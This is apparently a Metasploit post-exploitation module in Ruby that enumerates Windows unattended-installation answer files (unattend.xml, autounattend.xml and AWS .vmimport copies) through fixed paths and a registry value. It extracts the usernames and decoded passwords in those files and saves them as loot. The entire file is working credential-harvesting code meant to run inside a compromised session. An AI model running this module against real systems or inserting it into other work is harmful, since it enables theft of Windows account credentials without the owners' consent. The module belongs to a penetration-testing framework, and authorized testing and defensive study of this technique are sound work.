##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Unattended Answer File Enumeration',
        'Description' => %q{
          This module will check the file system for a copy of unattend.xml and/or
          autounattend.xml found in Windows Vista, or newer Windows systems.  And then
          extract sensitive information such as usernames and decoded passwords.  Also
          checks for '.vmimport' files that could have been created by the AWS EC2 VMIE service.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Sean Verity <veritysr1980[at]gmail.com>',
          'sinn3r',
          'Ben Campbell',
          'GhostlyBox'
        ],
        'References' => [
          ['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
          ['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580'],
          ['URL', 'https://aws.amazon.com/security/security-bulletins/AWS-2024-006/'],
          ['URL', 'https://www.immersivelabs.com/blog/the-return-of-unattend-xml-revenge-of-the-cleartext-credentials/']
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
      ]
    )
  end

  #
  # Read and parse the XML file
  #
  def load_unattend(xml_path)
    print_status("Reading #{xml_path}")
    raw = read_file(xml_path)

    begin
      xml = REXML::Document.new(raw)
    rescue REXML::ParseException => e
      print_error('Invalid XML format')
      vprint_line(e.message)
      return nil, raw
    end

    return xml, raw
  end

  #
  # Save Rex tables separately
  #
  def save_cred_tables(cred_table)
    t = cred_table
    vprint_line("\n#{t}\n")
    p = store_loot('windows.unattended.creds', 'text/plain', session, t.to_csv, t.header, t.header)
    print_good("#{t.header} saved as: #{p}")
  end

  #
  # Save the raw version of unattend.xml
  #
  def save_raw(xmlpath, data)
    return if data.empty?

    fname = ::File.basename(xmlpath)
    p = store_loot('windows.unattended.raw', 'text/plain', session, data)
    print_good("Raw version of #{fname} saved as: #{p}")
  end

  #
  # Initialize all possible paths for the answer file
  #
  def init_paths
    drive = expand_path('%SystemDrive%')

    files = [
      'unattend.xml',
      'autounattend.xml',
      'unattend.xml.vmimport',
      'autounattend.xml.vmimport'
    ]

    target_paths = [
      "#{drive}\\",
      "#{drive}\\Windows\\System32\\sysprep\\",
      "#{drive}\\Windows\\panther\\",
      "#{drive}\\Windows\\Panther\\Unattend\\",
      "#{drive}\\Windows\\System32\\"
    ]

    paths = []
    target_paths.each do |p|
      files.each do |f|
        paths << "#{p}#{f}"
      end
    end

    # Add UnattendFile path from the Windows Registry (if present)
    reg_path = registry_getvaldata('HKEY_LOCAL_MACHINE\\System\\Setup', 'UnattendFile')&.strip
    paths << reg_path unless reg_path.blank?

    return paths
  end

  def run
    init_paths.each do |xml_path|
      # If unattend.xml doesn't exist, move on to the next one
      unless exist?(xml_path)
        vprint_error("#{xml_path} not found")
        next
      end

      xml, raw = load_unattend(xml_path)
      save_raw(xml_path, raw)

      # XML failed to parse, will not go on from here
      next unless xml

      results = Rex::Parser::Unattend.parse(xml)
      table = Rex::Parser::Unattend.create_table(results)
      table.print unless table.nil?
      print_line

      # Save the data to a file, TODO: Save this as a Mdm::Cred maybe
      save_cred_tables(table) unless table.nil?

      break unless datastore['GETALL']
    end
  end
end
